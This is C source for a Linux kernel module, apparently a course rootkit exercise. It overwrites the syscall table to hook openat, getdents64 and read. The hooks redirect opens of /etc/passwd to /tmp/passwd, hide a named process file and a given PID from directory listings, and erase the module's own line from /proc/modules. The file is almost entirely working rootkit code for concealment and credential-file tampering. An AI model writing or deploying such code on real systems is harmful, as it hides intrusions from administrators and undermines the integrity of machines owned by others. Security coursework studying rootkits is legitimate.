#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>

//--------------------------------
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/file.h> 
#include <linux/slab.h>
//--------------------------------

#define PREFIX "sneaky_process"
#define PASSWD_PATH "/etc/passwd"
#define TMP_PASSWD_PATH "/tmp/passwd"

//--------------------------------
static char *sneaky_pid = "";
module_param(sneaky_pid, charp, 0);
MODULE_PARM_DESC(sneaky_pid, "sneaky process pid");
//--------------------------------


//This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);

  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }

  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  // --------------------------------
  char *path = (char *)regs->si;

  if (strcmp(path, PASSWD_PATH) == 0) {
    printk(KERN_INFO "INFO: Sneaky process is redirecting %s to %s\n", 
           PASSWD_PATH, TMP_PASSWD_PATH);

    if (copy_to_user(path, TMP_PASSWD_PATH, strlen(TMP_PASSWD_PATH) + 1) != 0) {
      printk(KERN_WARNING "WARNING: copy_to_user failed\n");
    }
  }
  // --------------------------------
  return (*original_openat)(regs);
}

//--------------------------------
asmlinkage ssize_t (*original_getdents64)(struct pt_regs *);

asmlinkage ssize_t sneaky_getdents64(struct pt_regs * regs){
  struct linux_dirent64 *dirp = (struct linux_dirent64 *)regs->si;
  ssize_t ret = original_getdents64(regs);

  if (ret <= 0)
    return ret;

  unsigned int offset = 0;
  unsigned int curr_len;
  struct linux_dirent64 *curr;

  while (offset < ret) {
    curr = (struct linux_dirent64 *)((char *)dirp + offset);

    if (strcmp(curr->d_name, PREFIX) == 0 || strcmp(curr->d_name, sneaky_pid) == 0){
      curr_len = curr->d_reclen;
      memmove(curr, (char *)((char *)curr + curr_len), (int)(ret - offset - curr_len));
      ret -= curr_len;
    }
    else{
      offset += curr->d_reclen;
    }
  }
  return ret;
}
//--------------------------------

//--------------------------------
asmlinkage ssize_t (*original_read)(struct pt_regs *);
//Change the behavior of read
asmlinkage ssize_t sneaky_read(struct pt_regs *regs)
{
  char *buffer = (char *)regs->si;
  char *line;
  char *line_end;
  ssize_t ret = original_read(regs);

  if (ret <= 0)
    return ret;

  unsigned long offset = 0;
  unsigned long line_len;

  int fd = regs->di;
  struct file *file = fget(fd);

  if (file == NULL) {
    return ret;
  }
  
  if(strcmp(file->f_path.dentry->d_iname, "modules") == 0){

    char *file_buf = kmalloc(ret + 1, GFP_KERNEL);
    if (file_buf == NULL) {
      fput(file);
      return ret;
    }

    if(copy_from_user(file_buf, buffer, ret) == 0){

      file_buf[ret] = '\0';
      
      while (offset < ret){

        line = file_buf + offset;
        line_end = strchr(line, '\n');

        if (line_end == NULL) {
          line_end = file_buf + ret;
        }

        line_len = line_end - line + 1;

        if(strstr(line, "sneaky_mod") != NULL) {
          memmove(line, line_end + 1, file_buf + ret - line_end - 1);
          ret -= line_len;
        }
        else {
          offset += line_len;
        }
      }
      if (copy_to_user(buffer, file_buf, ret) != 0){
        printk(KERN_WARNING "WARNING: mod remove fails");
      }
    }
    kfree(file_buf);
  }
  fput(file);
  return ret;
}
//--------------------------------


// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];

  //--------------------------------
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  original_read = (void *)sys_call_table[__NR_read];
  //--------------------------------
  
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;

  // You need to replace other system calls you need to hack here
  //--------------------------------
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;
  sys_call_table[__NR_read] = (unsigned long)sneaky_read;
  //--------------------------------
  
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;

  //--------------------------------
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  sys_call_table[__NR_read] = (unsigned long)original_read;
  //--------------------------------

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");
